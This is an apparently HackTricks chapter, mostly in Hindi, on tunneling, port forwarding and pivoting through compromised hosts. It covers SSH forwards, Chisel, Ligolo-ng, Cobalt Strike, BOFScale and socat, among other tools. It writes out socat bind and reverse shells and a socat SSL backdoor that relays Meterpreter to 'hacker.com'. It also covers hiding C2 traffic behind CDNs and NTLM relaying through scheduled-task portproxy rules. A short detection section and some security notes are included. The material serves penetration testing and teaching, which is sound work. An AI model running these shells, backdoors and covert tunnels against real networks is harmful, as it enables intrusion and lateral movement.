# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

किसी local HTTP या TCP service को public relay के ज़रिए उपलब्ध कराने के लिए, [exposing local services to the internet](expose-local-to-the-internet.md) देखें। इस अध्याय में hosts के बीच forwarding और pivoting शामिल हैं।

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

अंतिम command में account और WinRM host की पहचान के लिए Evil-WinRM के `-u` और `-i` options का उपयोग होता है; इसका default WinRM port 5985 है।<sup>[[5]](#references)</sup>

## Nmap tip

> [!WARNING]
> Nmap का proxy support केवल TCP connections तक सीमित है और ping, port या OS-detection scans पर इसका कोई असर नहीं पड़ता। जब scanner SOCKS proxy के पीछे हो, तो **host discovery बंद करें** (`-Pn`) और **TCP connect scan** (`-sT`) का उपयोग करें।<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH अपने एन्क्रिप्टेड चैनल पर X11 कनेक्शन, मनमाने TCP पोर्ट और Unix-domain sockets को फ़ॉरवर्ड कर सकता है।<sup>[[6]](#references)</sup>

SSH ग्राफ़िकल कनेक्शन (X)

`-Y` trusted X11 forwarding सक्षम करता है और `-C` फ़ॉरवर्ड किए गए डेटा के लिए compression का अनुरोध करता है।<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

SSH Server में नया Port खोलें --> अन्य port

Remote (`-R`) forwarding, SSH server पर listen करती है और local side से connect होती है; explicit bind address यह नियंत्रित करता है कि कौन-से interfaces उस listener तक पहुँच सकते हैं।<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port

Local (`-L`) forwarding client पर सुनता है और SSH server side से destination से connect करता है।<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> कहीं भी

Dynamic (`-D`) forwarding एक local SOCKS4/SOCKS5 listener बनाता है, जिसके connections remote side से खोले जाते हैं।<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### ProxyJump के साथ Multi-hop

`-J`/`ProxyJump` एक या अधिक comma-separated jump hosts के ज़रिए target से कनेक्ट करता है। Forwarding options अब भी अंतिम SSH connection से जुड़े होते हैं, इसलिए नीचे दिया गया SOCKS listener `internal-target` से destinations खोलता है, न कि पहले bastion से। इससे jump host में login करके वहाँ दूसरा SSH client शुरू करने की ज़रूरत नहीं पड़ती।<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Jump machines के लिए host-specific options को `~/.ssh/config` में रखना चाहिए; destination के लिए intended command-line configuration intermediate hosts पर अपने-आप लागू नहीं होती।<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

यह DMZ के रास्ते internal hosts से आपके host तक reverse shells पाने के लिए उपयोगी है:

Server की `GatewayPorts` setting नियंत्रित करती है कि remote forward loopback के बाहर bind हो सकता है या नहीं; इसकी default setting `no` है।<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

यह root-आधारित उदाहरण दोनों hosts पर tunnel devices बनाता है। Server को tun forwarding की अनुमति देनी होगी और चुने गए account को tun device का access होना चाहिए; यहाँ `root` account का उपयोग करने का एक तरीका `PermitRootLogin yes` है।<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Server side पर forwarding सक्षम करें

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

क्लाइंट-साइड पर एक नया route सेट करें

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 ने Terrapin के early-transport integrity attack का मुकाबला करने के लिए strict-KEX extension जोड़ा। जहाँ संभव हो, दोनों peers को अपडेट करें और पुराने implementations के लिए vendor guidance का पालन करें; यह न मानें कि forwarded channel केवल version के आधार पर सुरक्षित है।<sup>[[8]](#references)</sup>

## SSHUTTLE

आप किसी host के ज़रिए **ssh** से किसी **subnetwork** के सभी **traffic** को **tunnel** कर सकते हैं।\
उदाहरण के लिए, 10.10.10.0/24 पर जाने वाले सभी traffic को forward करना।

`sshuttle` SSH पर transparent proxying प्रदान करता है और नीचे दिखाए अनुसार subnets चुनने तथा custom SSH command का उपयोग करने की सुविधा देता है।<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

प्राइवेट की से कनेक्ट करें

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploit का `portfwd` local और remote forwarding को support करता है, जबकि इसका SOCKS proxy module session routes या `autoroute` के साथ काम करने के लिए बनाया गया है और इन उदाहरणों में यह डिफ़ॉल्ट रूप से port 1080 पर listen करता है।<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

स्थानीय पोर्ट --> समझौता किया हुआ होस्ट (active session) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

एक और तरीका:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt Strike का Beacon, Beacon के माध्यम से SOCKS4a/SOCKS5 कनेक्शन relay कर सकता है; `rportfwd` compromised host पर bind करता है, जबकि `rportfwd_local` destination connection को Cobalt Strike client से शुरू करता है।<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Team Server पर उन interfaces में एक port खोलें जिनसे Beacon के माध्यम से traffic route होना चाहिए।<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> इस मामले में, **port Beacon host में खोला जाता है**, Team Server में नहीं, और traffic Team Server तक भेजा जाता है, फिर वहाँ से निर्दिष्ट host:port तक।<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

The reverse-forwarding manual निम्नलिखित व्यवहार बताता है:<sup>[[14]](#references)</sup>

- Beacon का reverse port forward **Team Server तक traffic tunnel करने के लिए बनाया गया है, अलग-अलग machines के बीच relay करने के लिए नहीं**।
- Traffic को **Beacon के C2 traffic के भीतर tunnel किया जाता है**, जिसमें P2P links भी शामिल हैं।
- High ports आमतौर पर privileged-port restrictions से बचते हैं, लेकिन target OS policy और मौजूदा listeners फिर भी लागू होते हैं।

### rPort2Port local

> [!WARNING]
> इस मामले में, **port Beacon host पर खुलता है**, Team Server पर नहीं, और **traffic Cobalt Strike client को भेजा जाता है** (Team Server को नहीं) और फिर वहाँ से बताए गए host:port पर।<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Tailcat: बिना अकाउंट वाला userspace TCP forwarding

Tailcat, Tailscale के control plane के बिना उसके WireGuard/NAT-traversal/DERP data plane का उपयोग करता है। इसके लिए न तो Tailscale account की ज़रूरत होती है, न administrator privileges की, और यह host routes इंस्टॉल नहीं करता या DNS में बदलाव नहीं करता। [Tailscale Serve/Funnel](expose-local-to-the-internet.md#tailscale-funnel--serve) या in-process [BOFScale tailnet](#bofscale---cdn-fronted-in-process-tailnet) के विपरीत, server एक *tailcat address* को out of band साझा करता है। Client इस address का उपयोग remote node द्वारा serve किए गए port तक पहुँचने के लिए करता है।<sup>[[62]](#references)</sup>

Remote node पर port `4444` पर पहले से सुन रही TCP service के लिए, वहाँ `serve` चलाएँ और उसका प्रिंट किया हुआ address client पर `forward` को दें। दूसरा command डिफ़ॉल्ट रूप से `127.0.0.1:18080` पर bind करता है, इसलिए सामान्य TCP sockets को ही support करने वाली local process उस loopback port से connect कर सकती है, जबकि Tailcat उसका traffic remote port `4444` तक पहुँचाता है।<sup>[[62]](#references)</sup> Port numbers Tailcat के लिए खास नहीं हैं।<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

एड्रेस में server की WireGuard public key और, वर्तमान releases में default रूप से, एक pre-shared key होता है। इसे credential मानें: unrestricted server उस peer को स्वीकार करता है जिसे एड्रेस पता हो। Server बंद होने पर ephemeral एड्रेस काम करना बंद कर देता है। सेव किया गया `default` key बाद के runs में plain `serve` को वही स्थिर एड्रेस फिर से इस्तेमाल करने देता है, इसलिए startup message देखें और अगर एड्रेस उजागर हो सकता है, तो clients को `serve --allow` से सीमित करें।<sup>[[62]](#references)</sup>

Connections के लिए direct UDP path या DERP relay इस्तेमाल किया जा सकता है। इससे dedicated C2 domain की आवश्यकता नहीं रहती, लेकिन network activity गायब नहीं होती।<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - CDN के पीछे in-process tailnet

[BOFScale](https://github.com/NetSPI/BOFscale) modified Tailscale overlay को Windows C2 implant के अंदर चलाता है, बिना TUN driver या service install किए। इसके तीन components हैं: asynchronous CGo `c-shared` `tailscaled` BOF-PE, local API से communicate करने वाला एक छोटा C++ BOF-PE, और asynchronous `socksportfwd` TCP-to-SOCKS5 bridge।<sup>[[53]](#references)[[54]](#references)</sup>

### CDN-compatible TS2021 और DERP

Tailscale आम तौर पर Noise-आधारित TS2021 control channel और DERP relay के लिए proprietary HTTP upgrades इस्तेमाल करता है। BOFScale उन्हीं byte streams को बनाए रखता है, लेकिन उन्हें RFC 6455 WebSockets में ले जाता है और `Sec-WebSocket-Protocol: ts2021` या `derp` इस्तेमाल करता है। इससे operator-नियंत्रित Headscale/DERP origin ऐसे CDN के पीछे रखा जा सकता है जो केवल standard WebSocket upgrades स्वीकार करता हो। Patched client HTTP `500` के बाद WebSockets पर TS2021 का retry करता है, HTTP `426` के बाद DERP का retry करता है, और DERP WebSocket dialer को host proxy configuration का पालन करने देता है; BOF पहले प्रयास को छोड़ने के लिए `TS_DEBUG_DERP_WS_CLIENT=1` सेट करता है, जो ज्ञात रूप से विफल होता है।<sup>[[53]](#references)[[54]](#references)</sup>

CDN और origin proxy को `/ts2021` और `/derp` के लिए WebSocket upgrades सुरक्षित रखने होंगे, `/key` को सामान्य HTTP के रूप में forward करना होगा, और internal read/write timeouts बंद करने होंगे, क्योंकि relay sessions अनिश्चित समय तक खुले रह सकते हैं। दिया गया Headscale configuration `verify_clients` सक्षम करता है, केवल operator का embedded DERP map प्रकाशित करता है, और Tailscale-प्रबंधित relays पर fallback रोकने के लिए `derp.urls` खाली रखता है।<sup>[[53]](#references)[[54]](#references)</sup>

### In-process daemon और named-pipe control

Override न किए जाने पर, BOF entry point `tailscaled` को `-tun=userspace-networking`, `-state mem:`, और `-no-logs-no-support` के साथ शुरू करता है, फिर UUID-नाम वाला pipe बनाता है। यह Go stdout/stderr को OS pipe के ज़रिए Beacon output API तक redirect करता है, इसलिए पूरा daemon और Go runtime memory में बने रहते हैं, लेकिन state और logs किसी Tailscale directory में नहीं लिखे जाते।<sup>[[53]](#references)[[54]](#references)</sup>

Lightweight client उस pipe पर Tailscale का HTTP/1.0 local API दोहराता है। यह pipe को `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` के साथ खोलता है, क्योंकि daemon की `safesocket` layer pipe client का impersonate करती है; `Tailscale-Cap: 125` भेजता है; और local API को `up`, `down`, `status`, route advertisement और shutdown operations से map करता है।<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Daemon को shutdown करने के लिए कहने के बाद manually mapped Go BOF-PE को unload न करें: runtime और garbage-collector goroutines उस memory से execute होते रह सकते हैं जिसे loader unmap कर देता है। `tailscaled` को एक sacrificial process में चलाएँ और अंतिम cleanup के लिए उस process को terminate करें।<sup>[[54]](#references)</sup>

### Userspace SOCKS5 के ज़रिए host से शुरू होने वाला traffic bridge करें

Inbound tailnet connections और advertised subnet routes userspace network stack के अंदर काम करते हैं, लेकिन compromised host पर सामान्य processes के पास overlay तक OS route नहीं होता। इसलिए `socksportfwd` victim-facing TCP port पर listen करता है, daemon के `0.0.0.0:1080` listener के साथ SOCKS5 `NO AUTH` negotiate करता है, tailnet destination के लिए `CONNECT` जारी करता है, और दोनों दिशाओं में asynchronously relay करता है। जब target MagicDNS name हो, तो यह `ATYP_DOMAIN` इस्तेमाल करता है, जिससे `tailscaled` उस name को resolve करता है और वह Windows resolver के सामने उजागर नहीं होता।<sup>[[53]](#references)[[54]](#references)</sup>

Operator का एक न्यूनतम flow नीचे दिखाया गया है; operator node और implant, दोनों को patched binaries इस्तेमाल करनी होंगी, क्योंकि stock Tailscale इस CDN design से नहीं गुजर सकता।<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Local forward apparent authentication listener को relay tool से अलग कर सकता है: किसी मशीन से compromised host के bound port पर authenticate करवाएँ, उसे tailnet के ज़रिए `ntlmrelayx` तक forward करें, और फिर AD CS, LDAP, HTTP, SMB या किसी अन्य compatible target तक relay करें। Vulnerability-specific चरणों के लिए [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) और [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) देखें; BOFScale केवल transport है।<sup>[[54]](#references)</sup>

### Detection

किसी एक कमज़ोर संकेत के बजाय इनके संयोजन की तलाश करें: ऐसे process में Go runtime जो आम तौर पर Go-based नहीं होता, permissive SDDL `D:(A;;GA;;;WD)` वाला UUID pipe, अप्रत्याशित `0.0.0.0:1080` SOCKS listener, और CDN addresses से लंबे समय तक बने रहने वाले TLS WebSockets। TLS inspection के साथ, `Sec-WebSocket-Protocol: derp` या `ts2021` को flag करें, जब owning process कोई authorized `tailscaled` service न हो। Repository के `bofscale.yar` rules, तीनों BOF-PE components के लिए memory signatures देते हैं।<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

यह project `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` और `tunnel.php` जैसे web tunnel endpoints देता है; local proxy शुरू करने से पहले कोई एक supported endpoint upload करें।<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

इसे [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) के releases page से डाउनलोड कर सकते हैं\
Chisel, SSH-सुरक्षित connection का उपयोग करके HTTP पर TCP/UDP traffic भेजता है; compatible client/server builds का उपयोग करें और चुने गए release के command syntax की पुष्टि करें।<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) WebSocket, HTTP/2 या WebTransport (QUIC पर HTTP/3) के ज़रिए static या dynamic forwards ले जाता है। Current builds TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying और Linux transparent-proxy listeners को forward और reverse, दोनों modes में support करते हैं।<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

attacker पर server चलाएँ और `-R` के साथ pivot को outbound connection करने दें। इस दिशा में SOCKS5 listener **server** पर बनाया जाता है, जबकि अनुरोधित connections **client/pivot** network से शुरू होते हैं।<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

एक reverse static forward उसी दिशा का उपयोग करता है। उदाहरण के लिए, निम्नलिखित pivot द्वारा पहुँच योग्य `10.10.10.20:445` को attacker के loopback port `8445` पर expose करता है:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Egress और transport का विवरण

- Explicit HTTP proxy से होकर जाने के लिए client में `-p http://user:pass@proxy:8080` जोड़ें। `curl` जैसे clients में `socks5h://127.0.0.1:1080` इस्तेमाल करें (या application में proxied DNS सक्षम करें), ताकि internal names tunnel के पार resolve हों और local resolver तक leak न हों।<sup>[[52]](#references)</sup>
- `wss://` TLS-protected WebSocket चुनता है। `https://` client HTTP/2 चुनता है, लेकिन reverse proxies/CDNs द्वारा buffering या HTTP/1 conversion से bidirectional stream अक्सर टूट जाती है; इस mode को test करते समय wstunnel server को सीधे expose करें।<sup>[[52]](#references)</sup>
- `wts://` QUIC पर WebTransport चुनता है। Server को `--enable-webtransport` (या `wts://` listen URL) के साथ शुरू करें और listening port पर UDP की अनुमति दें। यह mode conventional HTTP `CONNECT` proxy से होकर नहीं जा सकता, क्योंकि वह proxy TCP ले जाता है।<sup>[[52]](#references)</sup>

> [!WARNING]
> Upstream project चेतावनी देता है कि इसके embedded self-signed certificate को privacy protection न मानें। Valid custom certificate के साथ `--tls-verify-certificate` (या mTLS) को प्राथमिकता दें, जब तक remote access जानबूझकर न चाहिए proxy listeners को loopback पर रखें, और confidentiality महत्वपूर्ण होने पर पहले से secure protocols को tunnel करें।<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng quickstart में proxy पर TUN interface, agent के लिए certificate-fingerprint validation, और tunneled network के लिए route setup का वर्णन है।<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Agent Binding और Listening

Ligolo-ng agent पर ऐसे listeners जोड़ सकता है जो proxy-side address पर forward करते हैं, और इसकी reserved `240.0.0.0/4` range को route करके agent-local services तक पहुँचा जा सकता है।<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Agent के Local Ports तक पहुँच

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot victim से reverse tunnel शुरू करता है और attacker के loopback address पर SOCKS4 proxy उपलब्ध कराता है; इसका README NTLM-proxy credentials और hash options का भी दस्तावेज़ीकरण करता है।<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

**NTLM proxy** के जरिए Pivot करें

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` और `PROXY` जैसे address types को जोड़ता है; नीचे दिए गए उदाहरण इन documented endpoints को मिलाते हैं।<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### socks के माध्यम से Port2Port

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### SSL Socat के माध्यम से Meterpreter

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

victim के console में पिछली line की जगह यह line execute करके, socat के documented `PROXY` address type से **non-authenticated proxy** के ज़रिए जा सकते हैं।<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat टनल

**/bin/sh console**

Client और Server, दोनों तरफ certificates बनाएँ.

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

स्थानीय SSH पोर्ट (22) को हमलावर होस्ट के 443 पोर्ट से कनेक्ट करें

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink, PuTTY का command-line connection tool है, जिसमें `ssh` जैसे SSH forwarding विकल्प हैं।<sup>[[22]](#references)</sup>

SSH port के लिए uppercase `-P` का उपयोग करें। `-pw` को compatibility के लिए रखा गया है, लेकिन इससे password process list में दिखता है; जहाँ संभव हो, key authentication या `-pwfile` को प्राथमिकता दें।<sup>[[22]](#references)[[23]](#references)</sup>

चूँकि यह binary victim पर execute होगी और यह एक SSH client है, reverse connection के लिए SSH service और port खोलें; नीचे `-R` का उपयोग करके locally accessible port को attacker की machine पर forward किया गया है।<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Persistent `portproxy` rules बनाते या बदलते समय, होस्ट के लिए आवश्यक permissions वाले context का उपयोग करें। Microsoft नीचे उपयोग किए गए `v4tov4` add, show और delete फ़ॉर्म को दस्तावेज़ित करता है।<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### scheduled task के ज़रिए `portproxy` deploy करना

जब administrative credentials उपलब्ध हों, तो remote Task Scheduler execution से कोई dedicated relay upload किए बिना native forwarding rule install किया जा सकता है। उदाहरण के लिए, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) pivot को TCP/443 पर listen करवा सकता है और connection को किसी internal SMB service तक relay कर सकता है।<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

यह नियम स्थायी रहता है, इसलिए इसे `netsh interface portproxy show v4tov4` से सूचीबद्ध करें और परीक्षण के बाद स्पष्ट रूप से हटाएँ। याद रखें कि `portproxy` केवल forwarding प्रदान करता है; host firewall को भी listening port की अनुमति देनी होगी।<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

आपके पास **system पर RDP access** होना चाहिए।\
डाउनलोड करें:

SocksOverRDP, मौजूदा RDP session पर SOCKS5 connection ले जाने के लिए Remote Desktop Dynamic Virtual Channels का उपयोग करता है; client plugin `127.0.0.1:1080` पर सुनता है, जबकि server component RDP target पर चलता है।<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - यह tool Windows के Remote Desktop Service feature के `Dynamic Virtual Channels` (`DVC`) का उपयोग करता है। DVC, **RDP connection पर packets को tunnel करने** के लिए ज़िम्मेदार है।
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

अपने client computer में **`SocksOverRDP-Plugin.dll`** इस तरह load करें:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

